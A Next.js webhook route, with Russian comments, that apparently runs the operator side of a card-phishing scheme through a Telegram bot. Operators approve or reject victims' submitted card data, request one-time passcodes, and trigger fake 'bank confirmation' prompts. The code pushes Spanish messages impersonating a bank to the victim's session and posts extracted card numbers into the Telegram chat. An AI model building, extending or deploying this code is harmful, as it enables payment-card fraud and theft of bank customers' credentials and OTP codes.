// app/api/telegram/route.ts
import { NextRequest, NextResponse } from 'next/server';
import fs from 'fs';
import os from 'os';
import path from 'path';

// Импортируй свой pushMessage (проверь путь)
import { pushMessage } from '../../lib/supportStore';

const BOT = process.env.TELEGRAM_BOT_TOKEN || '';
const APP_URL = process.env.APP_URL || ''; // например https://your-app.vercel.app

// ----------------- helper: update payment status -----------------
async function postToAppPaymentStatus(sessionId: string, status: string) {
  if (!APP_URL) return false;
  try {
    await fetch(`${APP_URL}/api/payment-status-vercel`, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ sessionId, status })
    });
    console.log('Posted status to APP_URL:', sessionId, status);
    return true;
  } catch (err) {
    console.error('Failed to post payment status to APP_URL', err);
    return false;
  }
}

// Dev fallback: write to temp file (NOT recommended for production/serverless)
const STATE_DIR = path.join(os.tmpdir(), 'payment-state');
const STATE_FILE = path.join(STATE_DIR, 'payment-state.json');

function readStateFile(): Record<string, any> {
  try {
    if (!fs.existsSync(STATE_FILE)) return {};
    const raw = fs.readFileSync(STATE_FILE, 'utf8');
    return raw ? JSON.parse(raw) : {};
  } catch (err) {
    console.error('Error reading state file:', err);
    return {};
  }
}
function writeStateFile(state: Record<string, any>) {
  try {
    fs.mkdirSync(STATE_DIR, { recursive: true });
    fs.writeFileSync(STATE_FILE, JSON.stringify(state, null, 2), 'utf8');
  } catch (err) {
    console.error('Error writing state file:', err);
  }
}

async function updatePaymentStatus(sessionId: string, status: string) {
  // try APP_URL first
  const posted = await postToAppPaymentStatus(sessionId, status);
  if (posted) return;
  // fallback to temp file for local dev
  try {
    const state = readStateFile();
    state[sessionId] = { status, updatedAt: new Date().toISOString() };
    writeStateFile(state);
    console.log('Wrote payment status to temp file', sessionId, status);
  } catch (err) {
    console.error('Failed writing fallback state', err);
  }
}

// ----------------- helper: telegram API -----------------
async function editTelegramMessage(chatId: number | string, messageId: number, text: string) {
  if (!BOT) return;
  try {
    await fetch(`https://api.telegram.org/bot${BOT}/editMessageText`, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ chat_id: chatId, message_id: messageId, text, parse_mode: 'Markdown' })
    });
  } catch (err) {
    console.error('editTelegramMessage error', err);
  }
}

async function sendTelegramMessage(chatId: number | string, text: string) {
  if (!BOT) return;
  try {
    await fetch(`https://api.telegram.org/bot${BOT}/sendMessage`, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ chat_id: chatId, text, parse_mode: 'Markdown' })
    });
  } catch (err) {
    console.error('sendTelegramMessage error', err);
  }
}

async function answerCallback(callbackQueryId: string, text = 'Processed') {
  if (!BOT) return;
  try {
    await fetch(`https://api.telegram.org/bot${BOT}/answerCallbackQuery`, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ callback_query_id: callbackQueryId, text })
    });
  } catch (err) {
    console.error('answerCallback error', err);
  }
}

// ----------------- main handler -----------------
export async function POST(req: NextRequest) {
  try {
    const body = await req.json();
    console.log('Telegram webhook received:', JSON.stringify(body, null, 2));

    // ------------- 1) inline callbacks -------------
    if (body.callback_query) {
      const cb = body.callback_query;
      const callbackData: string = cb.data || '';
      const chatId = cb.message?.chat?.id;
      const messageId = cb.message?.message_id; // оставляем для других веток
      const originalMessage = (cb.message?.text as string) || '';

      console.log('Callback data:', callbackData);

      // Helper to safely extract sessionId after a known prefix
      const removePrefix = (s: string, prefix: string) =>
        (s.startsWith(prefix) ? s.slice(prefix.length) : s);

      // ===== NEW: Push notification request from admin =====
      // callbackData format expected: "push_<sessionId>"
      if (callbackData.startsWith('push_')) {
        const sessionId = removePrefix(callbackData, 'push_');
        console.log('Push requested. sessionId =', sessionId);

        // Пытаемся достать карту из исходного текста сообщения
        // Ожидаем строку типа:
        // 💳 *Карта:* `1234 5678 9012 3456`
        // или "Карта: 1234 5678 9012 3456"
        // или "Card: 1234 5678 9012 3456"
        let cardNumber: string | null = null;
        const cardMatch =
          originalMessage.match(/Карта:\s*`?([^\n`]+)`?/i) ||
          originalMessage.match(/Card:\s*`?([^\n`]+)`?/i) ||
          originalMessage.match(/💳[^\n]*`?([0-9\s]+)`?/);

        if (cardMatch) {
          cardNumber = cardMatch[1].trim();
        }

        console.log(
          `PUSH clicked for session=${sessionId}` +
            (cardNumber ? `, card=${cardNumber}` : ', card=UNKNOWN')
        );

        // 1) обновляем статус, чтобы фронтенд ушёл в push flow
        await updatePaymentStatus(sessionId, 'push_requested');

        // 2) сообщение в supportStore — видит пользователь у себя на сайте
        try {
          pushMessage(sessionId, {
            id: `agent-push-${Date.now()}`,
            from: 'agent',
            text:
              '🔔 El banco solicita confirmación de la operación. En tu pantalla aparecerá una ventana для aprobar o rechazar la transacción. Pulsa "Aprobar" si todo está correcto.',
            time: new Date().toISOString()
          });
        } catch (err) {
          console.error('pushMessage error (push request)', err);
        }

        // 3) ОТДЕЛЬНЫЙ ЛОГ-МЕССЕДЖ В ТЕЛЕГРАМ ЧАТЕ
        if (chatId) {
          const logText =
            `🟢 Нажата кнопка *PUSH*\n` +
            `🔑 Сессия: \`${sessionId}\`\n` +
            `💳 Карта: \`${cardNumber || 'не найдена в тексте сообщения'}\``;

          await sendTelegramMessage(chatId, logText);
        }

        // 4) ответ на callback, чтобы убрать "часики"
        try {
          await answerCallback(cb.id, 'Push enviado');
        } catch (err) {
          console.error('answerCallback failure (push)', err);
        }

        // Return early — push handled
        return NextResponse.json({ ok: true });
      }

      // OTP variants: approve_otp_<id>, reject_otp_<id>, otp_success_<id>, otp_reject_<id>
      if (
        callbackData.startsWith('approve_otp_') ||
        callbackData.startsWith('reject_otp_') ||
        callbackData.startsWith('otp_success_') ||
        callbackData.startsWith('otp_reject_')
      ) {
        const isApprove =
          callbackData.startsWith('approve_otp_') || callbackData.startsWith('otp_success_');
        let sessionId = callbackData;
        sessionId = removePrefix(sessionId, 'approve_otp_');
        sessionId = removePrefix(sessionId, 'reject_otp_');
        sessionId = removePrefix(sessionId, 'otp_success_');
        sessionId = removePrefix(sessionId, 'otp_reject_');

        console.log('OTP action. sessionId=', sessionId, 'approve=', isApprove);

        if (isApprove) {
          await updatePaymentStatus(sessionId, 'approved');
          try {
            pushMessage(sessionId, {
              id: `agent-${Date.now()}`,
              from: 'agent',
              text: 'OTP confirmado por el operador. Pago aprobado.',
              time: new Date().toISOString()
            });
          } catch (err) {
            console.error('pushMessage error (approve OTP)', err);
          }

          if (chatId && messageId) {
            await editTelegramMessage(
              chatId,
              messageId,
              `${originalMessage}\n\n✅ **РЕЗУЛЬТАТ:** OTP код подтверждён! Платёж успешно обработан.\n🕐 Время обработки: ${new Date().toLocaleString()}`
            );
          }
        } else {
          await updatePaymentStatus(sessionId, 'otp_error');
          try {
            pushMessage(sessionId, {
              id: `agent-${Date.now()}`,
              from: 'agent',
              text: 'OTP rechazado por el operador. Por favor, reingresa el код.',
              time: new Date().toISOString()
            });
          } catch (err) {
            console.error('pushMessage error (reject OTP)', err);
          }

          if (chatId && messageId) {
            await editTelegramMessage(
              chatId,
              messageId,
              `${originalMessage}\n\n❌ **РЕЗУЛЬТАТ:** OTP код неверный. Пользователь должен ввести код повторно.\n🕐 Время обработки: ${new Date().toLocaleString()}`
            );
          }
        }
      }
      // Data approval: approve_<id> | reject_<id>
      else if (callbackData.startsWith('approve_') || callbackData.startsWith('reject_')) {
        const isApprove = callbackData.startsWith('approve_');
        let sessionId = callbackData;
        sessionId = removePrefix(sessionId, 'approve_');
        sessionId = removePrefix(sessionId, 'reject_');

        console.log('Data approval action. sessionId=', sessionId, 'approve=', isApprove);

        if (isApprove) {
          // operator approved data -> request OTP on frontend
          await updatePaymentStatus(sessionId, 'otp_requested');
          try {
            pushMessage(sessionId, {
              id: `agent-${Date.now()}`,
              from: 'agent',
              text: 'Datos aprobados por operador. Por favor, introduce el OTP.',
              time: new Date().toISOString()
            });
          } catch (err) {
            console.error('pushMessage error (approve data)', err);
          }

          if (chatId && messageId) {
            await editTelegramMessage(
              chatId,
              messageId,
              `${originalMessage}\n\n✅ **РЕЗУЛЬТАТ:** Данные одобрены!\n📱 Пользователю открыта страница для ввода OTP кода.\n📨 SMS провайдер отправит код на его телефон.\n⏳ Ожидаем ввода кода пользователем...\n🕐 Время обработки: ${new Date().toLocaleString()}`
            );
          }
        } else {
          // operator rejected data -> redirect user to re-enter
          await updatePaymentStatus(sessionId, 'rejected');
          try {
            pushMessage(sessionId, {
              id: `agent-${Date.now()}`,
              from: 'agent',
              text: 'Datos rechazados por operador. Reingresar datos.',
              time: new Date().toISOString()
            });
          } catch (err) {
            console.error('pushMessage error (reject data)', err);
          }

          if (chatId && messageId) {
            await editTelegramMessage(
              chatId,
              messageId,
              `${originalMessage}\n\n❌ **РЕЗУЛЬТАТ:** Данные отклонены. Пользователь будет перенаправлен для повторного ввода данных.\n🕐 Время обработки: ${new Date().toLocaleString()}`
            );
          }
        }
      } else {
        console.log('Unknown callback_data pattern:', callbackData);
      }

      // answer callback to clear "loading" in TG UI (для остальных кнопок)
      try {
        await answerCallback(cb.id, 'Обработано');
      } catch (err) {
        console.error('answerCallback failure', err);
      }
    }

    // ------------- 2) admin messages / replies -------------
    if (body.message) {
      const msg = body.message;
      const text = (msg.text || '').trim();

      // reply_to_message contains Session: `id` or Session: id
      if (msg.reply_to_message && typeof msg.reply_to_message.text === 'string') {
        const orig = msg.reply_to_message.text;
        const m = orig.match(/Session:\s*`?([^\s`]+)`?/);
        const sessionId = m ? m[1] : null;
        if (sessionId && text) {
          try {
            pushMessage(sessionId, {
              id: `agent-${Date.now()}`,
              from: 'agent',
              text,
              time: new Date().toISOString()
            });
            console.log('Pushed agent reply (reply_to_message) for', sessionId);
          } catch (err) {
            console.error('pushMessage error (reply_to_message)', err);
          }
        }
      } else {
        // support /reply <sessionId> <text>
        const parts = text.match(/^\/reply\s+(\S+)\s+([\s\S]+)/);
        if (parts) {
          const sid = parts[1];
          const text2 = parts[2];
          try {
            pushMessage(sid, {
              id: `agent-${Date.now()}`,
              from: 'agent',
              text: text2,
              time: new Date().toISOString()
            });
            console.log('Pushed agent reply (command) for', sid);
          } catch (err) {
            console.error('pushMessage error (command reply)', err);
          }
        }
      }
    }

    return NextResponse.json({ ok: true });
  } catch (err) {
    console.error('Telegram webhook error', err);
    return NextResponse.json({ ok: false, error: String(err) }, { status: 500 });
  }
}
